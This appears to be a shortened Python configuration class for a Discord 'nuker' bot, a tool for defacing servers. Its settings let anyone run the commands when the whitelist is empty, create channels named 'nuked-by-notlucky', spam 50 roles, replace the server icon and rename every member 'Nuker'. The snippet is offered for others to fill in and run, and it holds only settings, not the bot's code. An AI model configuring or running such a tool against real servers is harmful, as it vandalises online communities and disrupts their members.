...
class Config:
    ...
    WHITELIST = [YOUR_USER_ID]  # List of user IDs who can use the bot commands, don't give any ids if you want anyone to use bot.
    ...
    # ===== CHANNEL SETTINGS =====
    CHANNEL_NAME = "nuked-by-notlucky"  # Base name for created text channels
    ...
    ROLES_COUNT = 50  # How many roles to create
    ...
    SERVER_ICON_URL = "https://media.discordapp.net/attachments/1419371164731441175/1494091102943182929/channels4_profile.jpg?ex=69e15845&is=69e006c5&hm=836d488e56d7889fa770b7541ed78122607a75558787fdfe9176c6c31a48d908&=&format=webp"  # URL of new server icon
    NICKNAME = "Nuker"  # New nickname for all members
